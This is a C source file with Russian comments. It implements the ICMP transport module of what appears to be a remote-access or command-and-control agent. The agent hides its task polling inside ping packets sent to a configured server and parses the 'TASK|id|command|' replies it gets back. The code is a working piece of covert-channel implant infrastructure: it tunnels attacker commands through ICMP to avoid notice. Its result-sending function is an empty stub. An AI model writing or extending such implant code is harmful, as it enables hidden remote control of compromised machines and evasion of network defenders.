#include "config.h"
#include "transport.h"

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <inttypes.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/ip_icmp.h>

#define ICMP_MAX_ITERATIONS 10

static int current_sockfd = -1; //RAW_SOCKET
static struct in_addr server_addr;

/**
 * @brief Функция для расчета контрольной суммы icmp пакета
 *
 * @param data Указатель на данные (сам пакет)
 * @param len Длина данных (пакета)
 * @return Значение контрольной суммы
*/
int checksum(uint8_t* data, int len) {
    uint32_t summ = 0;
    uint16_t* p = (uint16_t*)data;

    while(len > 1) {
        summ += *p++;
        len -= 2;
    }

    if(len == 1) {
        uint16_t tmp = 0;
        *(uint8_t*)&tmp = *(uint8_t*)p;
        summ += tmp;
    }

    while(summ >> 16) {
        summ = (summ & 0xffff) + (summ >> 16);
    }

    return (uint16_t)(~summ);
}

/**
 * @brief Функция для инициализации сокета
 *
 * @param void Отсутствие аргументов
 *
 * @return В случае положительного исхода - 0 
*/
static int icmp_init(void) {
    current_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if(current_sockfd < 0) {
        printf("[-/ICMP] Error create socket.\n");
        return 1;
    }

    //установка тайм аута
    struct timeval tv = {
        .tv_sec = 5,
        .tv_usec = 0
    };
    setsockopt(current_sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    if(inet_pton(AF_INET, SERVER_IP, &server_addr) <= 0) {
        printf("[-/ICMP] Error server_addr.\n");
        close(current_sockfd);
        return 1;
    }

    return 0;
}
/**
 * @brief Функция для отправки icmp пакета
 *
 * @param data_request Полезная нагрузка, которую необходимо отправить
 * @param data_request_len Длина полезной нагрузки
 *
 * @return Функция возращает 0 в случае успеха
*/
int send_packet(char* data_request, int data_request_len) {
    char packet[1500];
    memset(packet, 0, sizeof(packet));

    //наложение структуры icmp на массив и заполнение полей пакета
    struct icmphdr* icmp_header = (struct icmphdr*)packet;
    icmp_header->type = ICMP_ECHO; //type 8
    icmp_header->code = 0;
    icmp_header->un.echo.id = htons(ICMP_ID); //идентификатор
    icmp_header->un.echo.sequence = htons(1);

    //data
    char* payload = packet + sizeof(struct icmphdr);
    strncpy(payload, data_request, data_request_len);
    int packet_len = sizeof(struct icmphdr) + data_request_len;

    //контрольная сумма
    icmp_header->checksum = checksum((uint8_t*)packet, packet_len);

    //подготовка для отправки пакета и его отправка
    struct sockaddr_in dest = {
        .sin_family = AF_INET,
        .sin_addr = server_addr,
    };
    if(sendto(current_sockfd, packet, packet_len, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
        printf("[-/ICMP] Error send packet.\n");
        return 1;
    } else {
        printf("[+/ICMP] Send icmp-packet for get task.\n");
    }
    return 0;
}

/**
 * @brief Функция позволяет получить команду агенту от сервера
 *
 * @param command Строка содержащая полученную команду для агента,
 * выходной аргумент
 * @param task_id Номер задачи, выходной аргумент
 * @param max_len_command Размер буфера под команду
 * @param max_len_task_id Размер буфера под номер задачи
 * @param agent_id id агента
 *
 * @return В случае положительного исхода - 0
*/
static int icmp_get_command(/*[OUT]*/ char* command,/*[OUT]*/ char* task_id, size_t max_len_command, size_t max_len_task_id, char* agent_id) {
    //формирование данных для отправки по icmp и отправка
    char data_request[30];
    memset(data_request, 0, sizeof(data_request));
    int data_request_len = snprintf(data_request, 29, "GET_TASK|%s|", agent_id);
    if(send_packet(data_request, data_request_len) != 0) {
        return 1;
    }

    //получение ответа от сервера
    struct sockaddr_in from;
    socklen_t from_len = sizeof(from);
    char packet_answer[1500];

    //получение нужного пакета(даем 10 итераций чтобы пропустить ненужные пакеты)
    int attempts_left = ICMP_MAX_ITERATIONS;
    while(attempts_left > 0) {
        memset(packet_answer, 0, sizeof(packet_answer));
        int recv_len = recvfrom(current_sockfd, packet_answer, sizeof(packet_answer), 0, (struct sockaddr*)&from, &from_len);
        
        if(recv_len <= 0 || recv_len < (int)sizeof(struct iphdr)) {
            return 1; //идем на следующую итерацию получения пакета, так как ничего не пришло либо битый пакет
        } else {
            //анализ полученных данных
            //данные приходят в сырой сокет с ip заголовком, который тоже надо обработать
            struct iphdr* ip = (struct iphdr*)packet_answer;
            int ip_hdr_len = ip->ihl * 4; //длина ip заголовка (ед. изм. = 4 байта)
            
            //icmp заголовок
            struct icmphdr* icmp_hdr = (struct icmphdr*)(packet_answer + ip_hdr_len);
            int icmp_len = recv_len - ip_hdr_len; //длина icmp пакета 
   
            //проверка ip адреса сервера
            if(from.sin_addr.s_addr != server_addr.s_addr) {
                continue;
            }
            //проверка контрольной суммы пришедшего пакета
            if(checksum((uint8_t*)(packet_answer + ip_hdr_len), icmp_len) != 0) {
                continue;
            }

            if((icmp_hdr->type == ICMP_ECHOREPLY) && (ntohs(icmp_hdr->un.echo.id) == ICMP_ID)) { 
                
                int data_from_len = recv_len - ip_hdr_len - (int)sizeof(struct icmphdr);
                if(data_from_len > 0) {
                    char* data_from = packet_answer + ip_hdr_len + (int)sizeof(struct icmphdr);
                    
                    //парсинг полученных данных
                    if(strncmp(data_from, "TASK|", 5) == 0) {
                        data_from += 5;
    
                        char* pos = strchr(data_from, '|');
                        if(pos != NULL) {
                            if(strncmp(data_from, "null", 4) == 0) {
                                printf("[+/ICMP] На данный момент задач для выполнения нет.\n");
                                return 1;
                            }
                            //длина до разделителя
                            size_t len = pos - data_from;
                            if(len > max_len_task_id - 1) {
                                printf("[-/ICMP] Error. Len task_id invalid.\n");
                                return 1;
                            }
                            memcpy(task_id, data_from, len);
                            task_id[len] = '\0';
                            data_from += (len + 1);
    
                            //само задание
                            pos = strchr(data_from, '|');
                            if(pos != NULL) {
                                len = pos - data_from;
                                if(len > max_len_command - 1) {
                                    printf("[-/ICMP] Error. Len task_command invalid.\n");
                                    return 1;
                                }
                                memcpy(command, data_from, len);
                                command[len] = '\0';
    
                                printf("[+/ICMP] Получена задача (%s): %s\n", task_id, command);
                                return 0;
                            } else {
                                printf("[-/ICMP] Error. Invalid task.\n");
                            }
                        } else {
                            printf("[-/ICMP] Invalid task_id.\n");
                            return 1;
                        }
                    } else {
                        continue;
                    }
                } else {
                    printf("[-/ICMP] The data is missing.\n");
                    return 1;
                }
            }
        }
        attempts_left--;
    }
    printf("[+/ICMP] No responce from the server.\n");
    return 1;
}

/**
 * @return В случае положительного исхода - 0
*/
static int icmp_send_result(char* task_id, char* result) {
    return 0;
}

void icmp_cleanup(void) {
    if(current_sockfd >= 0) {
        close(current_sockfd);
    }
}

//export module
TransportModule icmp_transport = {
    .name = "ICMP",
    .init = icmp_init,
    .get_command = icmp_get_command,
    .send_result = icmp_send_result,
    .cleanup = icmp_cleanup
};
